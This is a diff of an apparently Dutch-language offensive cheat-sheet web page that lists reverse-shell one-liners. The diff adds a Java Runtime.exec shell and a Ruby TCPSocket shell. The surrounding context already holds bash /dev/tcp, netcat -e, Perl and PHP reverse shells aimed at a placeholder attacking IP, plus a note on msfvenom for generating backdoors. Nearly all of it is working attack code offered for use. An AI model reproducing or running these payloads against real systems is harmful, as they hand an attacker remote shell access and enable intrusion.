@@ -528,14 +528,18 @@ Hallo! Ik bedank je voor verzoek! Hier heb je mijn pagina als antwoord :)
 <pre><code>exec /bin/bash 0&amp;0 2&gt;&amp;0 
 bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;1
 </code></pre><h3 id="java">Java</h3>
-<h3 id="netcat">Netcat</h3>
+<pre><code>r = Runtime.getRuntime()
+p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/ATTACKING-IP/80;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])
+p.waitFor()
+</code></pre><h3 id="netcat">Netcat</h3>
 <pre><code>nc -e /bin/sh ATTACKING-IP 80
 </code></pre><h3 id="perl">Perl</h3>
 <pre><code>perl -e &#39;use Socket;$i=&quot;IP&quot;;$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;
 </code></pre><h3 id="-php-https-www-php-net-"><a href="https://www.php.net">PHP</a></h3>
 <pre><code>php -r &#39;$sock=fsockopen(&quot;&lt;ip&gt;&quot;,&lt;port&gt;);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;
 </code></pre><h3 id="ruby">Ruby</h3>
-<h2 id="msfvenom">MSFVenom</h2>
+<pre><code>ruby -rsocket -e&#39;f=TCPSocket.open(&quot;&lt;ip&gt;&quot;,&lt;port&gt;).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;
+</code></pre><h2 id="msfvenom">MSFVenom</h2>
 <p>Msfvenom is de payloadgenerator van het Metasploit Framework. Met deze payloadgenerator kan je eenvoudig code genereren die diverse soorten backdoors, reverse shells of andere toepassingen bieden. </p>
 <h3 id="linux">Linux</h3>
 <h3 id="mac">Mac</h3>
